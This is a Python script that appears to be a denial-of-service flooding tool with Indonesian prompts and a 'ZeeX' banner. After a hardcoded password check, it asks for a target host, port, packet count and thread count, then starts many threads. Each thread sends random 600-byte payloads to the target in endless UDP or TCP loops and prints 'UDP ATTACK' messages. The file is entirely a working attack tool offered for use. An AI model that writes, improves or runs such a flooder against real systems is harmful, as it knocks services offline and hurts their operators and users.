import random
import socket
import threading
import time
import os,sys

os.system("clear")
password = "ZeeX"

for x in range(100):
    pwd = input("\033[92mPASSWORD : \033[91m")
    j=3
    if(pwd==password):
        time.sleep(3)
        print("\033[92mCHECK PASSWORD!!!")
        break
    else:
        time.sleep(5)
        print("\033[92mPASSWORD SALAH!!!")
        continue
time.sleep(5)
print("\033[92mLOGIN BERHASIL MENGGUNAKAN PASSWORD \u001b[31m{}".format(pwd))
time.sleep(5)
os.system("clear")

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]

os.system("clear")
print("""\033[95m
▒███████▒▓█████ ▓█████ ▒██   ██▒
▒ ▒ ▒ ▄▀░▓█   ▀ ▓█   ▀ ▒▒ █ █ ▒░
░ ▒ ▄▀▒░ ▒███   ▒███   ░░  █   ░
  ▄▀▒   ░▒▓█  ▄ ▒▓█  ▄  ░ █ █ ▒ 
▒███████▒░▒████▒░▒████▒▒██▒ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░░ ▒░ ░▒▒ ░ ░▓ ░
░░▒ ▒ ░ ▒ ░ ░  ░ ░ ░  ░░░   ░▒ ░
░ ░ ░ ░ ░   ░      ░    ░    ░  
  ░ ░       ░  ░   ░  ░ ░    ░  
░
""")
print("\033[0m")
ip = str(input("\033[92mHOST/IP: \033[91m"))
port = int(input("\033[92mPORT: \033[91m"))
choice = str(input("\033[92mGAS?(y/n): \033[91m"))
times = int(input("\033[92mPAKET: \033[91m"))
threads = int(input("\033[92mTHREAD: \033[91m"))
os.system("clear")
def run():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")
def run2():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run3():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run4():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run5():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run6():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run7():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run8():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      print("[!] DOWN")

def run9():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[!] DOWN")

def run10():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[!] DOWN")

def run11():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[!] DOWN")

def run12():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[!] DOWN")

def run13():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[!] DOWN")

def run14():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[!] DOWN")

def run15():
  data = random._urandom(600)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> UDP ATTACK TO IP %s AND PORT %s"%(ip,port))
    except:
      s.close()
      print("[×] DOWN")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
    else:
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
        th = threading.Thread(target = run14)
        th.start()
        th = threading.Thread(target = run15)
        th.start()